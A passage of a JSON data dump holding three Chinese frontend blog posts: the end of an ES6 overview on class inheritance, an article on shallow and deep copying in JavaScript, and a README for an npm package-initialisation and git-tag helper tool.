class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name;\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，就是class在ES6中得到了封装，可以使得现在的方式更加的优美。\u003c/p\u003e\n\u003cp\u003e之后，我们简单了解一下\u003cstrong\u003e继承\u003c/strong\u003e这个概念吧。\u003c/p\u003e\n\u003cp\u003e任何的东西，都是需要继承的。因为我们不可能都是从头去写这个类。往往是在原有类的基础之上，对它进行完善。在ES6之前，我们可能对构造函数完成的是\u003cstrong\u003e组合式继承\u003c/strong\u003e。示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAnimal\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\nAnimal.prototype.sayName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name;\n}\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eDog\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename, barking\u003c/span\u003e)\u003c/span\u003e{\n  Animal.call(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, name);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.barking = barking;\n}\nDog.prototype = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Animal();\nDog.prototype.constructor = Dog;\nDog.prototype.makeBarking = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.barking;\n}\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e dog = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Dog(\u003cspan class=\"hljs-string\"\u003e'zimo'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'汪汪汪'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(dog.makeBarking());   \u003cspan class=\"hljs-comment\"\u003e//汪汪汪\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(dog.sayName());  \u003cspan class=\"hljs-comment\"\u003e//zimo\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样子的组合式继承书写起来，比较麻烦，需要重新去对每个元素设置，然后还要重新定义新类的原型。那么，我们可以来看一下ES6对于继承的封装：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAnimal\u003c/span\u003e\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name){\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n    }\n\n      sayName(){\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name;\n    }\n}\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eDog\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAnimal\u003c/span\u003e\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name, barking){\n        \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(name);\n          \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.barking = barking;\n    }\n\n      makeBarking(){\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.barking;\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样子，就可以轻松的完成之前的组合式继承步骤了。如果你对extends的封装感兴趣的话，不妨看一下这篇文章\u003ca href=\"https://github.com/laizimo/zimo-article/issues/18\"\u003ejavascript之模拟类继承\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e在这里ES6的内容只是总结了部分，大致可以分为这么几个部分：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e变量定义——let和const\u003c/li\u003e\n\u003cli\u003e函数的变化——箭头函数、剩余参数\u003c/li\u003e\n\u003cli\u003e数组的变动——解构，展开符\u003c/li\u003e\n\u003cli\u003e字符串——模版字符串、startsWith、endsWith\u003c/li\u003e\n\u003cli\u003eIterator和for...of\u003c/li\u003e\n\u003cli\u003eGenerator和Promise\u003c/li\u003e\n\u003cli\u003eClass和extends\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e希望，你可以从这些内容中对ES6多一些了解，同时，如果你还想深入ES6进行了解的话，最直接的方式就是看书。希望你的代码写的越来越优雅。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果你对我写的有疑问，可以评论，如我写的有错误，欢迎指正。你喜欢我的博客，请给我关注Star~呦。大家一起总结一起进步。欢迎关注我的\u003ca href=\"https://github.com/laizimo/zimo-article/issues\"\u003egithub博客\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514880997.1695","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98a"},"id":"59658504f265da6c415f3324","author":{"$oid":"5a4b774a85b30d097483e982"},"imageCache":[{"imageUrlArray":["https://github.com/mqyqingfeng/Blog/raw/master/Images/copy/copy1.png"],"screenShot":null}],"title":"JavaScript专题之深浅拷贝","meta":{"likeCount":0},"tag":["JavaScript","前端"],"comment":[],"shortContent":" JavaScript 专题系列第六篇，讲解深浅拷贝的技巧和以及实现深浅拷贝的思路 前言 拷贝也是面试经典呐！ 数组的浅拷贝 如果是数组，我们可以利用数组的一些方法比如：slice、concat 返回一个新数组的特性来实现拷贝。 比如： var arr = ['old', 1, …","content":"\u003cblockquote\u003e\n\u003cp\u003eJavaScript 专题系列第六篇，讲解深浅拷贝的技巧和以及实现深浅拷贝的思路\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"-\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e拷贝也是面试经典呐！\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e数组的浅拷贝\u003c/h2\u003e\n\u003cp\u003e如果是数组，我们可以利用数组的一些方法比如：slice、concat 返回一个新数组的特性来实现拷贝。\u003c/p\u003e\n\u003cp\u003e比如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e arr = [\u003cspan class=\"hljs-string\"\u003e'old'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e];\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e new_arr = arr.concat();\n\nnew_arr[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'new'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arr) \u003cspan class=\"hljs-comment\"\u003e// [\"old\", 1, true, null, undefined]\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(new_arr) \u003cspan class=\"hljs-comment\"\u003e// [\"new\", 1, true, null, undefined]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e用 slice 可以这样做：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e new_arr = arr.slice();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是如果数组嵌套了对象或者数组的话，比如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e arr = [{\u003cspan class=\"hljs-attr\"\u003eold\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'old'\u003c/span\u003e}, [\u003cspan class=\"hljs-string\"\u003e'old'\u003c/span\u003e]];\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e new_arr = arr.concat();\n\narr[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].old = \u003cspan class=\"hljs-string\"\u003e'new'\u003c/span\u003e;\narr[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'new'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arr) \u003cspan class=\"hljs-comment\"\u003e// [{old: 'new'}, ['new']]\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(new_arr) \u003cspan class=\"hljs-comment\"\u003e// [{old: 'new'}, ['new']]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们会发现，无论是新数组还是旧数组都发生了变化，也就是说使用 concat 方法，克隆的并不彻底。\u003c/p\u003e\n\u003cp\u003e如果数组元素是基本类型，就会拷贝一份，互不影响，而如果是对象或者数组，就会只拷贝对象和数组的引用，这样我们无论在新旧数组进行了修改，两者都会发生变化。\u003c/p\u003e\n\u003cp\u003e我们把这种复制引用的拷贝方法称之为浅拷贝，与之对应的就是深拷贝，深拷贝就是指完全的拷贝一个对象，即使嵌套了对象，两者也相互分离，修改一个对象的属性，也不会影响另一个。\u003c/p\u003e\n\u003cp\u003e所以我们可以看出使用 concat 和 slice 是一种浅拷贝。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e数组的深拷贝\u003c/h2\u003e\n\u003cp\u003e那如何深拷贝一个数组呢？这里介绍一个技巧，不仅适用于数组还适用于对象！那就是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e arr = [\u003cspan class=\"hljs-string\"\u003e'old'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, [\u003cspan class=\"hljs-string\"\u003e'old1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'old2'\u003c/span\u003e], {\u003cspan class=\"hljs-attr\"\u003eold\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}]\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e new_arr = \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.parse( \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(arr) );\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(new_arr);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e是一个简单粗暴的好方法，就是有一个问题，不能拷贝函数，我们做个试验：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e arr = [\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a)\n}, {\n    \u003cspan class=\"hljs-attr\"\u003eb\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(b)\n    }\n}]\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e new_arr = \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.parse(\u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(arr));\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(new_arr);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们会发现 new_arr 变成了：\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://github.com/mqyqingfeng/Blog/raw/master/Images/copy/copy1.png\" alt=\"不能拷贝函数\"/\u003e\u003cfigcaption\u003e不能拷贝函数\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e浅拷贝的实现\u003c/h2\u003e\n\u003cp\u003e以上三个方法 concat、slice、JSON.stringify 都算是技巧类，可以根据实际项目情况选择使用，接下来我们思考下如何实现一个对象或者数组的浅拷贝。\u003c/p\u003e\n\u003cp\u003e想一想，好像很简单，遍历对象，然后把属性和属性值都放在一个新的对象不就好了~\u003c/p\u003e\n\u003cp\u003e嗯，就是这么简单，注意几个小点就可以了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e shallowCopy = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eobj\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 只拷贝对象\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e obj !== \u003cspan class=\"hljs-string\"\u003e'object'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n    \u003cspan class=\"hljs-comment\"\u003e// 根据obj的类型判断是新建一个数组还是对象\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e newObj = obj \u003cspan class=\"hljs-keyword\"\u003einstanceof\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e ? [] : {};\n    \u003cspan class=\"hljs-comment\"\u003e// 遍历obj，并且判断是obj的属性才拷贝\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e obj) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (obj.hasOwnProperty(key)) {\n            newObj[key] = obj[key];\n        }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e newObj;\n}\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-\"\u003e深拷贝的实现\u003c/h2\u003e\n\u003cp\u003e那如何实现一个深拷贝呢？说起来也好简单，我们在拷贝的时候判断一下属性值的类型，如果是对象，我们递归调用深拷贝函数不就好了~\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e deepCopy = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eobj\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e obj !== \u003cspan class=\"hljs-string\"\u003e'object'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e newObj = obj \u003cspan class=\"hljs-keyword\"\u003einstanceof\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e ? [] : {};\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e obj) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (obj.hasOwnProperty(key)) {\n            newObj[key] = \u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e obj[key] === \u003cspan class=\"hljs-string\"\u003e'object'\u003c/span\u003e ? deepCopy(obj[key]) : obj[key];\n        }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e newObj;\n}\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-\"\u003e性能问题\u003c/h2\u003e\n\u003cp\u003e尽管使用深拷贝会完全的克隆一个新对象，不会产生副作用，但是深拷贝因为使用递归，性能会不如浅拷贝，在开发中，还是要根据实际情况进行选择。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e下期预告\u003c/h2\u003e\n\u003cp\u003e难道到这里就结束了？是的。然而本篇实际上是一个铺垫，我们真正要看的是 jquery 的 extend 函数的实现，下一篇，我们会讲一讲如何从零实现一个 jquery 的 extend 函数。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e专题系列\u003c/h2\u003e\n\u003cp\u003eJavaScript专题系列目录地址：\u003ca href=\"https://github.com/mqyqingfeng/Blog\" target=\"_blank\"\u003ehttps://github.com/mqyqingfeng/Blog\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003eJavaScript专题系列预计写二十篇左右，主要研究日常开发中一些功能点的实现，比如防抖、节流、去重、类型判断、拷贝、最值、扁平、柯里、递归、乱序、排序等，特点是研(chao)究(xi) underscore 和 jQuery 的实现方式。\u003c/p\u003e\n\u003cp\u003e如果有错误或者不严谨的地方，请务必给予指正，十分感谢。如果喜欢或者有所启发，欢迎 star，对作者也是一种鼓励。\u003c/p\u003e\n","buildTime":"1514854059.6125","__v":0}
{"_id":{"$oid":"5a4cc1f937991328ecbc7453"},"id":"5a4c9cbd6fb9a0451c3aca66","author":{"$oid":"5a4cc1f937991328ecbc744f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"pp-assistor","meta":{"likeCount":0},"tag":["NPM","开源","前端"],"comment":[],"shortContent":"用项目默认配置。 附上团队内部修改过的GitFlow 流程。a-successful-git-branching-model/ 原博客结尾有 keynote 源码哈，可以在这基础上改出适合自己团队的 GitFlow","content":"\u003cblockquote\u003e\n\u003cp\u003enpm 包初始化和 git tag 辅助工具。源于搜车前端内部规范化改造，具体指内部功能模块 SDK 化和 GitFlow 流程规范化。Github: \u003ca target=\"_blank\" href=\"http://git.scm.ppmoney.com/Automation/pp-assistor\"\u003ehttp://git.scm.ppmoney.com/Automation/pp-assistor\u003c/a\u003e 欢迎 star 和 pr\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003eUsage\u003c/h2\u003e\n\u003cp\u003e全局安装\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003enpm install -g pp-assistor\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在项目根目录（package.json 所在文件夹）执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003epp-assistor\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e弹出如下选择界面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003e? 选择要执行的命令 (Use arrow keys)\n  ❯ init (用于 npm 包初始化，请在 npm init 后执行) \n    tag (用于发布前 master 分支的 tag 标记)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e选择 init 后的交互（Gif)\u003c/strong\u003e\u003cbr\u003e\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"npm-assistor-init\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb48a2b227eb3?w=1001\u0026amp;h=542\u0026amp;f=gif\u0026amp;s=398271\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e选择 tag 后的交互（Gif)\u003c/strong\u003e\u003cbr\u003e\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"npm-assistor-tag\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb48fbeb13dbb?w=985\u0026amp;h=425\u0026amp;f=gif\u0026amp;s=546608\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eConfig（Important!!）\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003econfig 读取规则\u003c/strong\u003e\u003cbr\u003e\n优先读取用户目录下的 \u003ccode\u003e~/.npm_assistor.yml\u003c/code\u003e 文件，如果不存在，则使\n用项目默认配置。\u003cbr\u003e\n默认配置如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs yaml\" lang=\"yaml\"\u003e\u003cspan class=\"hljs-comment\"\u003e################### npm-assistor Configuration Example #########################\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e################## 公共模版库配置 #########################\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003etemplates:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# github 远端配置库，会调用 api.github.com 相关 Api 进行内容获取\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 支持多仓库\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# github:\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# - https://github.com/plusmancn/npm-assistor-template.git\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# - http://wangzhe@git.scm.ppmoney.com/Automation/npm-assistor-template.git\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# Todo 最好支持下 gitlab，实现内网服务\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003e    gitlab:\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003e        - http:\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e//git.scm.ppmoney.com/Automation/pp-assistor-template.git\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e################## gitignore 服务器地址 #########################\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#  项目地址: https://github.com/joeblau/gitignore.io\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#  土豪大大们，可以选择在国内部署一份，屌丝只用得起国外便宜货\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003egitignore_server:\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttps://www.gitignore.io\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eInit 说明\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eeslintrc\u003c/strong\u003e\u003cbr\u003e\n具体 IDE 集成参考：\u003ca target=\"_blank\" href=\"http://eslint.org/\"\u003eeslint.org\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLICENSE（未做集成）\u003c/strong\u003e\u003cbr\u003e\n\u003ca target=\"_blank\" href=\"https://opensource.org/licenses/alphabetical\"\u003elicenses list by name\u003c/a\u003e\u003cbr\u003e\n并未做成命令行，具体可以参考，源码 \u003ccode\u003elicenses-files\u003c/code\u003e 文件夹，内含思维导图 xmind 格式\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"popular-license\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb499c65b97f6?w=3508\u0026amp;h=2479\u0026amp;f=png\u0026amp;s=473575\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eTag 说明\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eTag说明\u003c/strong\u003e\u003cbr\u003e\n发布号部分遵循 \u003ca target=\"_blank\" href=\"http://f2e.souche.com/blog/fan-yi-ru-he-zheng-que-de-ming-ming-ruan-jian-ban-ben-hao/\"\u003esemver\u003c/a\u003e 规范设计，简版说明如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e格式如 ${major}.${feature}.${patch}，遵循 semver 规范的版本号\n    选择需要递增的版本号\n        major: 主版本号，用于断代更新或大版本发布\n        feature: 特性版本号，用于向下兼容的特性新增\n        patch: 修订版本号，用于 bug 修复\n递增位的右侧位需要清零，如 \u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e =\u0026gt; \u003cspan class=\"hljs-number\"\u003e1.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发布日期部分遵循 \u003ccode\u003e{year}w{weeks}{a-z: 本周第几次发布}\u003c/code\u003e，此部分可选，如果服务端项目发布必带；sdk 发布一般不带\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e周数定义\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e moment = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'moment'\u003c/span\u003e);\n\u003cspan class=\"hljs-comment\"\u003e// 更新 week 设置\u003c/span\u003e\nmoment.locale(\u003cspan class=\"hljs-string\"\u003e'zh-cn'\u003c/span\u003e, {\n    \u003cspan class=\"hljs-comment\"\u003e// 每年第一周的定义：\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 国内：包含1月4号的那周为每年第一周\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 美国：包含1月1号的那周为每年第一周（苹果日历也是如此）\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 更新了下 moment，现在规则是 包含1月1号的那周为每年第一周，新的一周起始于周一\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//（比较好理解，苹果日历也可设置，设置-\u0026gt;高级-\u0026gt;显示周数）\u003c/span\u003e\n    week : {\n        \u003cspan class=\"hljs-attr\"\u003edow\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// Monday is the first day of the week.\u003c/span\u003e\n        doy : \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e// The week that contains Jan 1th is the first week of the year.\u003c/span\u003e\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eGitFlow 流程\u003c/strong\u003e\u003cbr\u003e\n附上团队内部修改过的GitFlow 流程。\u003ca target=\"_blank\" href=\"http://nvie.com/posts/a-successful-git-branching-model/\"\u003ea-successful-git-branching-model/\u003c/a\u003e 原博客结尾有 keynote 源码哈，可以在这基础上改出适合自己团队的 GitFlow\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"GitFlowV2 Of souche\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb4b30cbbb54c?w=2104\u0026amp;h=1488\u0026amp;f=jpeg\u0026amp;s=475850\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAbout\u003c/h2\u003e\n\u003cp\u003eHave Fun!\u003c/p\u003e\n","buildTime":"1514979732.1051","__v":0}
